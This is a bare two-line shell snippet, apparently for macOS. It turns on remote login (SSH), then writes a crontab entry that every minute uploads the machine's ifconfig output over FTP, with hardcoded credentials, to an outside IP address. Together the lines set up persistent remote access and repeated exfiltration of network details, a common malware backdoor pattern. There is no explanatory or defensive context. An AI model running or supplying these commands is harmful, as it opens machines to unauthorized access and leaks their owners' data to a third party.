systemsetup -setremotelogin on
echo "* * * * * ifconfig | curl -T - ftp://ftpu:123123@192.241.143.224/ip.txt" | crontab -
